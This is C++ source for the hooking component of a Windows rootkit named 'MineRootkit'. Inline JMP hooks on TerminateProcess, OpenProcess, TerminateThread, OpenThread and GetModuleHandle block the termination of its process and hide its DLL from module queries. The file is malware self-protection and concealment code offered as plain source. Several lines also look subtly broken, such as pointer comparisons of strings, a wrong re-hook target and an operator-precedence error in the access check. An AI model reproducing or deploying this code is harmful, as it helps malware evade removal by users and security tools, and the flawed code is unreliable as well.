#include <Windows.h>
#include <TlHelp32.h>
#include <comdef.h>
#include <bcrypt.h>
#include <winternl.h>
#include <Psapi.h>

FARPROC OpenProcessAddr = GetProcAddress(GetModuleHandle(L"kernelbase.dll"), "OpenProcess");
FARPROC TerminateThreadAddr = GetProcAddress(GetModuleHandle(L"kernelbase.dll"), "TerminateThread");
FARPROC OpenThreadAddr = GetProcAddress(GetModuleHandle(L"kernelbase.dll"), "OpenThread");
FARPROC NtQueryInformationProcessAddr = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");

bool Hook(void* src, void* dst, int len)
{
    if (len < 5) return false;
    DWORD curProtection;
    VirtualProtect(src, len, PAGE_EXECUTE_READWRITE, &curProtection);
    memset(src, 0x90, len);
    uintptr_t relativeAddress = ((uintptr_t)dst - (uintptr_t)src) - 5;
    *(BYTE*)src = 0xE9;
    *(uintptr_t*)((uintptr_t)src + 1) = relativeAddress;
    DWORD temp;
    VirtualProtect(src, len, curProtection, &temp);
    return true;
}

BOOL _stdcall HookedTerminateProcess(HANDLE hProcess, UINT uExitCode)
{
    FARPROC TerminateProcessAddr = GetProcAddress(GetModuleHandleA("kernelbase.dll"), "TerminateProcess");
    WCHAR processExecutablePath[MAX_PATH + 1] = { 0 };
    DWORD processExecutablePathSize = MAX_PATH;
    if (!QueryFullProcessImageNameW(hProcess, PROCESS_NAME_NATIVE, processExecutablePath, &processExecutablePathSize))
    {
        Hook(TerminateProcess, TerminateProcessAddr, 5);
        BOOL Result = TerminateProcess(hProcess, uExitCode);
        Hook(TerminateProcess, HookedTerminateProcess, 5);
        return Result;
    }

    if (!wcsstr(processExecutablePath, L"MineRootkit.exe"))
    {
        Hook(TerminateProcess, TerminateProcessAddr, 5);
        BOOL Result = TerminateProcess(hProcess, uExitCode);
        Hook(TerminateProcess, HookedTerminateProcess, 5);
        return Result;
    }
    else
    {
        SetLastError(ERROR_ACCESS_DENIED);
        return 0;
    }
}

void HookTerminateProcess()
{
    Hook(TerminateProcess, HookedTerminateProcess, 5);
}

DWORD GetMineRootkitPID()
{
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
    PROCESSENTRY32 pEntry;
    pEntry.dwSize = sizeof(pEntry);
    BOOL hRes = Process32First(hSnapShot, &pEntry);
    while (hRes)
    {
        _bstr_t b(pEntry.szExeFile);
        if (strcmp(b, "MineRootkit.exe") == 0)
        {
            return (DWORD)pEntry.th32ProcessID;
        }
        hRes = Process32Next(hSnapShot, &pEntry);
    }
}

HANDLE __stdcall HookedOpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId)
{
    if (dwProcessId == GetMineRootkitPID() && dwDesiredAccess == PROCESS_TERMINATE | PROCESS_VM_OPERATION)
    {
        SetLastError(ERROR_ACCESS_DENIED);
        return 0;
    }
    else
    {
        Hook(OpenProcess, OpenProcessAddr, 5);
        HANDLE ProcessHandle = OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);
        Hook(OpenProcess, HookedOpenProcess, 5);
        return ProcessHandle;
    }
}

void HookOpenProcess()
{
    Hook(OpenProcess, HookedOpenProcess, 5);
}

FARPROC GetModuleHandleAReal = GetProcAddress(GetModuleHandle(L"kernelbase.dll"), "GetModuleHandleA");
FARPROC GetModuleHandleWReal = GetProcAddress(GetModuleHandle(L"kernelbase.dll"), "GetModuleHandleW");

HMODULE __stdcall HookedGetModuleHandleA(LPCSTR lpModuleName)
{
    if (lpModuleName == "MineRootkitHooking.dll")
    {
        SetLastError(ERROR_MOD_NOT_FOUND);
        return 0;
    }
    else
    {
        Hook(GetModuleHandleA, GetModuleHandleAReal, 5);
        HMODULE Result = GetModuleHandleA(lpModuleName);
        Hook(GetModuleHandleA, HookedGetModuleHandleA, 5);
        return Result;
    }
}

HMODULE __stdcall HookedGetModuleHandleW(LPCWSTR lpModuleName)
{
    if (lpModuleName == L"MineRootkitHooking.dll")
    {
        SetLastError(ERROR_MOD_NOT_FOUND);
        return 0;
    }
    else
    {
        Hook(GetModuleHandleW, GetModuleHandleWReal, 5);
        HMODULE Result = GetModuleHandleW(lpModuleName);
        Hook(GetModuleHandleW, HookedGetModuleHandleW, 5);
        return Result;
    }
}

void HookGetModuleHandle()
{
    Hook(GetModuleHandleA, HookedGetModuleHandleA, 5);
    Hook(GetModuleHandleW, HookedGetModuleHandleW, 5);
}

BOOL _stdcall HookedTerminateThread(HANDLE hThread, DWORD dwExitCode)
{
    if (GetProcessIdOfThread(hThread) == GetMineRootkitPID())
    {
        SetLastError(ERROR_ACCESS_DENIED);
        return false;
    }
    else
    {
        Hook(TerminateThread, TerminateThreadAddr, 5);
        BOOL Result = TerminateThread(hThread, dwExitCode);
        Hook(TerminateThread, TerminateThreadAddr, 5);
        return Result;
    }
}

void HookTerminateThread()
{
    Hook(TerminateThread, HookedTerminateThread, 5);
}

HANDLE __stdcall HookedOpenThread(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId)
{
    Hook(OpenThread, OpenThreadAddr, 5);
    HANDLE ThreadHandle = OpenThread(PROCESS_QUERY_INFORMATION, false, dwThreadId);
    DWORD PIDOfThread = GetProcessIdOfThread(ThreadHandle);
    CloseHandle(ThreadHandle);
    Hook(OpenThread, HookedOpenThread, 5);
    if (PIDOfThread == GetMineRootkitPID())
    {
        SetLastError(ERROR_ACCESS_DENIED);
        return 0;
    }
    else
    {
        Hook(OpenThread, OpenThreadAddr, 5);
        HANDLE ThreadHandle = OpenThread(dwDesiredAccess, bInheritHandle, dwThreadId);
        Hook(OpenThread, HookedOpenThread, 5);
        return ThreadHandle;
    }
}

void HookOpenThread()
{
    Hook(OpenThread, HookedOpenThread, 5);
}